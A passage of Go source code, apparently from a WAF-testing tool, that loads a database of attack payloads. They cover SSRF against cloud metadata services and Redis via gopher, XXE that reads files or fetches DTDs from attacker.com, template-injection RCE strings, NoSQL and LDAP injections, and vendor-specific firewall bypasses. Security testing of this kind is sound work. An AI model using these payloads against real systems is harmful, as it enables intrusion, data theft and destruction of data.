		{ID: "ssrf-004", Payload: "http://0.0.0.0/", Category: "ssrf", Notes: "0.0.0.0", SeverityHint: "high", Tags: []string{"localhost"}, ExpectedBlock: true},
		{ID: "ssrf-005", Payload: "http://169.254.169.254/latest/meta-data/", Category: "ssrf", Notes: "AWS metadata", SeverityHint: "critical", Tags: []string{"cloud", "aws"}, ExpectedBlock: true},
		{ID: "ssrf-006", Payload: "http://metadata.google.internal/computeMetadata/v1/", Category: "ssrf", Notes: "GCP metadata", SeverityHint: "critical", Tags: []string{"cloud", "gcp"}, ExpectedBlock: true},
		{ID: "ssrf-007", Payload: "http://169.254.169.254/metadata/instance", Category: "ssrf", Notes: "Azure metadata", SeverityHint: "critical", Tags: []string{"cloud", "azure"}, ExpectedBlock: true},
		{ID: "ssrf-008", Payload: "http://0177.0.0.1/", Category: "ssrf", Notes: "Octal encoding", SeverityHint: "high", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},
		{ID: "ssrf-009", Payload: "http://2130706433/", Category: "ssrf", Notes: "Decimal IP", SeverityHint: "high", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},
		{ID: "ssrf-010", Payload: "http://0x7f000001/", Category: "ssrf", Notes: "Hex IP", SeverityHint: "high", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},
		{ID: "ssrf-011", Payload: "http://127.1/", Category: "ssrf", Notes: "Short IP", SeverityHint: "high", Tags: []string{"evasion"}, ExpectedBlock: true},
		{ID: "ssrf-012", Payload: "file:///etc/passwd", Category: "ssrf", Notes: "File protocol", SeverityHint: "critical", Tags: []string{"protocol"}, ExpectedBlock: true},
		{ID: "ssrf-013", Payload: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL", Category: "ssrf", Notes: "Gopher Redis", SeverityHint: "critical", Tags: []string{"protocol", "gopher"}, ExpectedBlock: true},
		{ID: "ssrf-014", Payload: "dict://127.0.0.1:6379/INFO", Category: "ssrf", Notes: "Dict protocol", SeverityHint: "high", Tags: []string{"protocol", "dict"}, ExpectedBlock: true},
	}

	db.AddBatch(payloads)
}

func (db *Database) loadXXEPayloads() {
	payloads := []Payload{
		{ID: "xxe-001", Payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>`, Category: "xxe", Notes: "Basic XXE", SeverityHint: "critical", Tags: []string{"basic"}, ExpectedBlock: true},
		{ID: "xxe-002", Payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root/>`, Category: "xxe", Notes: "External DTD", SeverityHint: "critical", Tags: []string{"external"}, ExpectedBlock: true},
		{ID: "xxe-003", Payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>`, Category: "xxe", Notes: "PHP wrapper XXE", SeverityHint: "critical", Tags: []string{"php"}, ExpectedBlock: true},
		{ID: "xxe-004", Payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>`, Category: "xxe", Notes: "Expect XXE", SeverityHint: "critical", Tags: []string{"rce"}, ExpectedBlock: true},
		{ID: "xxe-005", Payload: `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;%send;]><data/>`, Category: "xxe", Notes: "OOB XXE", SeverityHint: "critical", Tags: []string{"oob"}, ExpectedBlock: true},
		{ID: "xxe-006", Payload: `<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>`, Category: "xxe", Notes: "Element definition", SeverityHint: "critical", Tags: []string{"basic"}, ExpectedBlock: true},
		{ID: "xxe-007", Payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`, Category: "xxe", Notes: "Windows XXE", SeverityHint: "critical", Tags: []string{"windows"}, ExpectedBlock: true},
	}

	db.AddBatch(payloads)
}

func (db *Database) loadSSTIPayloads() {
	payloads := []Payload{
		// Jinja2/Python
		{ID: "ssti-001", Payload: "{{7*7}}", Category: "ssti", Notes: "Basic probe", SeverityHint: "high", Tags: []string{"probe"}, ExpectedBlock: true},
		{ID: "ssti-002", Payload: "{{config}}", Category: "ssti", Notes: "Config access", SeverityHint: "high", Tags: []string{"jinja2"}, ExpectedBlock: true},
		{ID: "ssti-003", Payload: "{{self.__class__.__mro__[2].__subclasses__()}}", Category: "ssti", Notes: "MRO traversal", SeverityHint: "critical", Tags: []string{"jinja2", "rce"}, ExpectedBlock: true},
		{ID: "ssti-004", Payload: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", Category: "ssti", Notes: "File read", SeverityHint: "critical", Tags: []string{"jinja2", "lfi"}, ExpectedBlock: true},
		{ID: "ssti-005", Payload: "{{''.class.mro[2].subclasses()[40]('id').read()}}", Category: "ssti", Notes: "Dotless RCE", SeverityHint: "critical", Tags: []string{"jinja2", "rce"}, ExpectedBlock: true},

		// Twig/PHP
		{ID: "ssti-010", Payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", Category: "ssti", Notes: "Twig RCE", SeverityHint: "critical", Tags: []string{"twig", "rce"}, ExpectedBlock: true},
		{ID: "ssti-011", Payload: "{{['id']|filter('system')}}", Category: "ssti", Notes: "Twig filter", SeverityHint: "critical", Tags: []string{"twig", "rce"}, ExpectedBlock: true},

		// Freemarker/Java
		{ID: "ssti-020", Payload: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", Category: "ssti", Notes: "Freemarker RCE", SeverityHint: "critical", Tags: []string{"freemarker", "java", "rce"}, ExpectedBlock: true},
		{ID: "ssti-021", Payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", Category: "ssti", Notes: "Freemarker assign", SeverityHint: "critical", Tags: []string{"freemarker", "java", "rce"}, ExpectedBlock: true},

		// Velocity/Java
		{ID: "ssti-030", Payload: "#set($str=$class.inspect(\"java.lang.String\").type)", Category: "ssti", Notes: "Velocity class", SeverityHint: "critical", Tags: []string{"velocity", "java"}, ExpectedBlock: true},

		// ERB/Ruby
		{ID: "ssti-040", Payload: "<%= system('id') %>", Category: "ssti", Notes: "ERB RCE", SeverityHint: "critical", Tags: []string{"erb", "ruby", "rce"}, ExpectedBlock: true},
		{ID: "ssti-041", Payload: "<%= `id` %>", Category: "ssti", Notes: "ERB backtick", SeverityHint: "critical", Tags: []string{"erb", "ruby", "rce"}, ExpectedBlock: true},
	}

	db.AddBatch(payloads)
}

func (db *Database) loadNoSQLPayloads() {
	payloads := []Payload{
		// MongoDB
		{ID: "nosql-001", Payload: `{"$gt":""}`, Category: "nosql", Notes: "MongoDB greater than", SeverityHint: "high", Tags: []string{"mongodb", "operator"}, ExpectedBlock: true},
		{ID: "nosql-002", Payload: `{"$ne":null}`, Category: "nosql", Notes: "MongoDB not equal", SeverityHint: "high", Tags: []string{"mongodb", "operator"}, ExpectedBlock: true},
		{ID: "nosql-003", Payload: `{"$where":"return true"}`, Category: "nosql", Notes: "MongoDB $where", SeverityHint: "critical", Tags: []string{"mongodb", "where"}, ExpectedBlock: true},
		{ID: "nosql-004", Payload: `{"$where":"sleep(5000)"}`, Category: "nosql", Notes: "MongoDB sleep", SeverityHint: "high", Tags: []string{"mongodb", "time-based"}, ExpectedBlock: true},
		{ID: "nosql-005", Payload: `{"username":{"$regex":"^admin"}}`, Category: "nosql", Notes: "MongoDB regex", SeverityHint: "high", Tags: []string{"mongodb", "regex"}, ExpectedBlock: true},
		{ID: "nosql-006", Payload: `{"$or":[{},{"a":"a"}]}`, Category: "nosql", Notes: "MongoDB OR", SeverityHint: "high", Tags: []string{"mongodb", "operator"}, ExpectedBlock: true},
		{ID: "nosql-007", Payload: `username[$ne]=1&password[$ne]=1`, Category: "nosql", Notes: "Query string injection", SeverityHint: "high", Tags: []string{"mongodb", "querystring"}, ExpectedBlock: true},
		{ID: "nosql-008", Payload: `{"username":{"$gt":""},"password":{"$gt":""}}`, Category: "nosql", Notes: "Auth bypass", SeverityHint: "critical", Tags: []string{"mongodb", "auth-bypass"}, ExpectedBlock: true},
	}

	db.AddBatch(payloads)
}

func (db *Database) loadLDAPPayloads() {
	payloads := []Payload{
		{ID: "ldap-001", Payload: "*", Category: "ldap", Notes: "Wildcard injection", SeverityHint: "high", Tags: []string{"basic"}, ExpectedBlock: true},
		{ID: "ldap-002", Payload: "*)(uid=*))(|(uid=*", Category: "ldap", Notes: "Filter injection", SeverityHint: "high", Tags: []string{"filter"}, ExpectedBlock: true},
		{ID: "ldap-003", Payload: "*)(&", Category: "ldap", Notes: "AND injection", SeverityHint: "high", Tags: []string{"operator"}, ExpectedBlock: true},
		{ID: "ldap-004", Payload: "*)(|", Category: "ldap", Notes: "OR injection", SeverityHint: "high", Tags: []string{"operator"}, ExpectedBlock: true},
		{ID: "ldap-005", Payload: "admin)(|(password=*)", Category: "ldap", Notes: "Password enum", SeverityHint: "high", Tags: []string{"enumeration"}, ExpectedBlock: true},
		{ID: "ldap-006", Payload: "x*)(objectClass=*", Category: "ldap", Notes: "Object class access", SeverityHint: "high", Tags: []string{"enumeration"}, ExpectedBlock: true},
	}

	db.AddBatch(payloads)
}

func (db *Database) loadVendorBypasses() {
	payloads := []Payload{
		// ModSecurity bypasses
		{ID: "vendor-001", Payload: "' /*!50000OR*/ 1=1--", Category: "sqli", Notes: "vendor:modsecurity ModSecurity version comment", SeverityHint: "critical", Tags: []string{"bypass", "modsecurity", "evasion"}, ExpectedBlock: true},
		{ID: "vendor-002", Payload: "'+UNION+ALL+SELECT+1,2,3--", Category: "sqli", Notes: "vendor:modsecurity Plus as space", SeverityHint: "critical", Tags: []string{"bypass", "modsecurity", "evasion"}, ExpectedBlock: true},
		{ID: "vendor-003", Payload: "'/**/union/**/select/**/1,2,3--", Category: "sqli", Notes: "vendor:modsecurity Comment spaces", SeverityHint: "critical", Tags: []string{"bypass", "modsecurity", "evasion"}, ExpectedBlock: true},

		// Cloudflare bypasses
		{ID: "vendor-010", Payload: "<svg/onload=alert(1)>", Category: "xss", Notes: "vendor:cloudflare SVG without space", SeverityHint: "high", Tags: []string{"bypass", "cloudflare", "evasion"}, ExpectedBlock: true},
		{ID: "vendor-011", Payload: "'-var x=1-'", Category: "sqli", Notes: "vendor:cloudflare Arithmetic injection", SeverityHint: "high", Tags: []string{"bypass", "cloudflare", "evasion"}, ExpectedBlock: true},

		// AWS WAF bypasses
		{ID: "vendor-020", Payload: "' or 1 like 1--", Category: "sqli", Notes: "vendor:aws-waf LIKE instead of =", SeverityHint: "critical", Tags: []string{"bypass", "aws-waf", "evasion"}, ExpectedBlock: true},
		{ID: "vendor-021", Payload: "' or 1 REGEXP 1--", Category: "sqli", Notes: "vendor:aws-waf REGEXP bypass", SeverityHint: "critical", Tags: []string{"bypass", "aws-waf", "evasion"}, ExpectedBlock: true},

		// Imperva bypasses
		{ID: "vendor-030", Payload: "' OR 1<2--", Category: "sqli", Notes: "vendor:imperva Less than comparison", SeverityHint: "critical", Tags: []string{"bypass", "imperva", "evasion"}, ExpectedBlock: true},

		// Generic WAF bypasses using Unicode
		{ID: "vendor-040", Payload: "＇ OR 1=1--", Category: "sqli", Notes: "vendor:generic Fullwidth quote", SeverityHint: "critical", Tags: []string{"bypass", "unicode", "evasion"}, ExpectedBlock: true},
		{ID: "vendor-041", Payload: "' OR ⓵=⓵--", Category: "sqli", Notes: "vendor:generic Circled numbers", SeverityHint: "critical", Tags: []string{"bypass", "unicode", "evasion"}, ExpectedBlock: true},
	}

	db.AddBatch(payloads)
}

// DefaultDatabase returns a database with all built-in payloads
func DefaultDatabase() *Database {
	return NewDatabase()
}

//go:embed payloads.json
var embeddedPayloads embed.FS

// LoadEmbeddedPayloads loads payloads from embedded JSON (if available)
func (db *Database) LoadEmbeddedPayloads() error {
	data, err := embeddedPayloads.ReadFile("payloads.json")
	if err != nil { //nolint:nilerr // intentional: file not embedded is normal, use built-in
		return nil
	}
	return db.LoadFromJSON(data)
}
